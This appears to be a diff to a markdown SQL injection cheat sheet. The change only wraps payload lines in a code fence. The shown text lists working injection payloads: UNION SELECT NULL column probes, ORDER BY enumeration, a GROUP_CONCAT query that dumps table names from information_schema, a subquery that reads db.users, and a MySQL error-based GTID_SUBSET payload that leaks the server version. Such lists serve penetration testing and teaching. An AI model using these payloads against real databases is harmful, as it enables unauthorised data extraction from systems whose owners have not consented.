@@ -15,11 +15,12 @@ UNION SELECT NULL;--
 UNION SELECT NULL, NULL;--
 
 ## ORDER BY Method
+```sql
 ORDER BY 1 --+
 GROUP BY 1--+
-
 UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
 1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
+```
 
 ## Mysql error-based
 AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
